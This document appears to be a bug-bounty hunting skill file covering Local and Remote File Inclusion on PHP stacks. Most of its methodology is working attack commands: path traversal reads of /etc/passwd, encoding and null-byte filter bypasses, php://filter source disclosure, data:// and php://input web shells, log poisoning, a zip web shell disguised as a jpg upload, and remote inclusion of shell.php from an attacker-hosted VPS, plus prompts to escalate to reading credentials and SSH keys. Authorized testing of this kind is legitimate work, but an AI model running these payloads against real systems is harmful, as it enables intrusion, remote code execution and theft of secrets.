---
name: lfi-rfi
description: >
  Hunt for Local and Remote File Inclusion: path traversal to read/include local files,
  null-byte/truncation tricks on legacy stacks, and PHP wrapper abuse (php://filter,
  php://input, data://, phar://, zip://, expect://). Use when a parameter names a file,
  template, page, or language to load — `?page=`, `?template=`, `?lang=`, `?file=`,
  download/export endpoints, theme/plugin loaders.
  Keywords: lfi, rfi, local file inclusion, remote file inclusion, path traversal,
  directory traversal, ../../, null byte, php://filter, php wrapper, log poisoning,
  zip wrapper RCE, phar deserialization.
  Do NOT use for pure directory-listing/misconfiguration with no traversal primitive — use
  info-disclosure. Do NOT use once a wrapper chain reaches code execution — continue
  under rce for that half of the write-up.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-22, CWE-98, CWE-434]
  mitre_attack: [T1083, T1190]
  tools: [curl, ffuf, wfuzz, burp]
depends_on: [active-recon, web-crawling, param-discovery]
feeds_into: [chain-analysis, rce, info-disclosure]
chains_with: [rce, info-disclosure, ssrf]
---

## Signals

- Params that name a resource to load server-side: `page`, `template`, `view`, `file`, `lang`,
  `module`, `doc`, `report`, `theme`, `include`.
- PHP stacks specifically (wrapper abuse is PHP-specific) — check `X-Powered-By: PHP`, `.php`
  extensions, `PHPSESSID` cookie.
- Download/export endpoints that take a filename/path param and stream file content back.
- Legacy app signals (old PHP version, no modern framework routing) — null-byte truncation only
  works on PHP < 5.3.4ish, so this narrows applicability fast.
- Any endpoint whose response changes meaningfully when you append `../` sequences (even a
  generic error change is worth investigating further).

## Prerequisites

- An identified file/path-naming parameter.
- Knowledge (or a guess) of the target OS (Linux vs Windows) to pick the right traversal depth/
  separator and target files.
- For RFI: confirmation the include function can fetch remote URLs (`allow_url_include` enabled
  in PHP — rare on modern/hardened stacks, but still worth a quick check) and your own
  infra to host the payload file.

## Methodology

1. **Baseline and basic traversal probe:**
   ```bash
   curl -s "https://target/view?page=about"                     # baseline
   curl -s "https://target/view?page=../../../../etc/passwd"
   curl -s "https://target/view?page=....//....//....//etc/passwd"   # filter-bypass doubling
   curl -s "https://target/view?page=..%2f..%2f..%2fetc%2fpasswd"    # URL-encoded
   curl -s "https://target/view?page=..%252f..%252f..%252fetc%252fpasswd"  # double-encoded
   curl -s "https://target/view?page=/etc/passwd"                # absolute path, no traversal needed
   ```
   For Windows targets:
   ```bash
   curl -s "https://target/view?page=..\\..\\..\\windows\\win.ini"
   curl -s "https://target/view?page=C:\\windows\\win.ini"
   ```

2. **Extension-appended inclusion bypass** (when the app force-appends `.php`/`.html` to the
   param, blocking plain traversal to non-matching files):
   ```bash
   curl -s "https://target/view?page=../../../../etc/passwd%00"       # null byte (old PHP only)
   curl -s "https://target/view?page=../../../../etc/passwd/."        # trailing dot/slash trick
   curl -s "https://target/view?page=../../../../etc/passwd%2500"     # encoded null byte
   ```

3. **PHP wrapper abuse — source disclosure without execution** (when traversal reaches a `.php`
   file you want to *read*, not execute):
   ```bash
   curl -s "https://target/view?page=php://filter/convert.base64-encode/resource=config"
   # decode the response body:
   curl -s "https://target/view?page=php://filter/convert.base64-encode/resource=config" | base64 -d
   ```

4. **`php://input` / `data://` for RCE via LFI** (local file inclusion escalated to code
   execution without needing a remote file — useful when `allow_url_include` is off but
   `allow_url_fopen`/data wrapper still works):
   ```bash
   # data:// wrapper, base64-encoded PHP payload inline (no upload needed)
   PAYLOAD='<?php system($_GET["cmd"]); ?>'
   B64=$(echo -n "$PAYLOAD" | base64)
   curl -s "https://target/view?page=data://text/plain;base64,$B64&cmd=id"

   # php://input — payload goes in the POST body, included directly
   curl -s -X POST "https://target/view?page=php://input" --data '<?php system($_GET["cmd"]); ?>' \
     -G --data-urlencode "cmd=id"
   ```

5. **Log poisoning → LFI-to-RCE** (classic chain when wrappers are disabled but a log file is
   both world-writable-via-injection and includable):
   ```bash
   # poison a log the app will later include, e.g. via User-Agent into access.log
   curl -s -A '<?php system($_GET["cmd"]); ?>' "https://target/"
   # then include the poisoned log and trigger it
   curl -s "https://target/view?page=../../../../var/log/apache2/access.log&cmd=id"
   ```

6. **Zip wrapper RCE** (upload a malicious zip, then include it via the `zip://` wrapper to
   execute the contained PHP):
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   zip payload.zip shell.php
   mv payload.zip payload.jpg   # disguise if upload filter checks extension only
   curl -s -X POST https://target/upload -F "file=@payload.jpg"
   curl -s "https://target/view?page=zip://./uploads/payload.jpg%23shell.php&cmd=id"
   ```

7. **Remote File Inclusion** (only if `allow_url_include`-style remote fetch is confirmed —
   test cautiously, it's uncommon on hardened/modern stacks):
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   python3 -m http.server 80   # on your VPS, serving shell.php
   curl -s "https://target/view?page=http://YOUR_VPS/shell.php&cmd=id"
   ```

8. **Automated fuzzing for traversal depth/wordlist sweep:**
   ```bash
   ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
     -u "https://target/view?page=FUZZ" -mr "root:.*:0:0:" -o lfi_sweep.json -of json
   wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     --hc 404 "https://target/view?page=FUZZ"
   ```

## Tooling

- `curl` — manual confirmation for every variant above; always the first proof step.
- `ffuf`/`wfuzz` with SecLists LFI wordlists — breadth sweep for traversal depth and known
  sensitive-file targets.
- Burp Suite Intruder — same sweep, with response-size/status clustering to spot anomalies.

## Root Causes

- User input concatenated directly into a filesystem path or `include()`/`require()` call
  without canonicalization and allowlist checking.
- Relying on blocklist filtering (`str_replace("../", "", $input)`) which is defeated by
  doubling (`....//`), encoding, or non-dot-dot absolute paths.
- PHP wrapper support left enabled (`allow_url_fopen`, `allow_url_include`) when the app never
  needs remote resource loading.
- Logs, upload directories, or session files writable by user-controlled content and reachable
  by the same inclusion primitive (the log/zip-poisoning chains).

## Validation Gate (minimum proof)

- Actual file content from a known system file (`/etc/passwd` contents, `win.ini` `[fonts]`
  section) returned in the response, or via a wrapper-decoded response (base64 decode shown in
  the writeup).
- For RCE escalation: command output reflected or OOB callback received, same bar as rce.
- Document exact traversal depth/encoding and wrapper string used — these are highly
  stack-specific and must be reproducible verbatim.

## Gotchas

- **Minimum proof, not a filesystem crawl.** One confirmed file (ideally one with no sensitive
  content, `/etc/passwd`, `win.ini`) is proof; don't pivot to reading credential files or
  app secrets without checking whether that's needed for the specific finding being
  demonstrated, and flag before doing so if it crosses into clearly sensitive data.
- **Common N/A:** app resolves the path with `realpath()`/`basename()` before use, stripping
  traversal sequences entirely — confirm by testing whether *any* encoding/doubling variant
  still works before concluding not-vulnerable; if none do, this is a solid N/A.
- **Common N/A:** `allow_url_include` is off (default and recommended since PHP 5.2) — RFI via
  `http://` wrapper will simply fail; don't report RFI as a finding without confirming this
  setting's effective state via a real round-trip test, not just an assumption from PHP version.
- **Overclaim trap:** a `200` response to a traversal payload that returns the *same* content as
  the baseline page is not proof — confirm the response content actually matches the target
  file's real content, not a default/fallback page the app serves for any invalid `page` value.
- Null-byte truncation is dead on any currently-supported PHP version — don't spend much time on
  it; note as a quick test, move past it fast.
- Wrapper-based payloads (`php://filter`, `zip://`, `phar://`) are extremely version/
  configuration-sensitive — a failure on one doesn't rule out the class, cycle through the
  relevant wrappers for the confirmed backend language before declaring N/A.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Full RCE via log/wrapper poisoning** — Can LFI be escalated to RCE via log poisoning (inject code into logs, then include them) or PHP wrappers (php://filter, phar://, expect://)?
2. **Remote file inclusion to RCE** — If RFI is possible, can you include an attacker-hosted file to achieve direct code execution?
3. **Sensitive file read beyond the obvious** — Beyond /etc/passwd, can you read app source, config files, or credentials (.env, database config, SSH keys)?
4. **Path traversal depth/filter bypass** — Does the filter block naive ../ but allow encoded, double-encoded, or null-byte variants to reach arbitrary depth?
5. **Chain with SSRF** — Does the inclusion mechanism allow fetching internal URLs, effectively acting as an SSRF primitive (RFI over an HTTP wrapper)?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- LFI → **rce** via log poisoning, `php://input`, `data://`, or `zip://` wrapper chains (see
  steps 5-6 above).
- LFI → **info-disclosure** (source code, config files, credentials in flat files).
- SSTI's template-engine `include` directive abuse (ssti) overlaps with this when the
  underlying primitive is a path-traversal-capable template loader.
- RFI chains directly into **rce** the moment a remote payload is fetched and executed —
  there's no meaningful intermediate state to report separately.
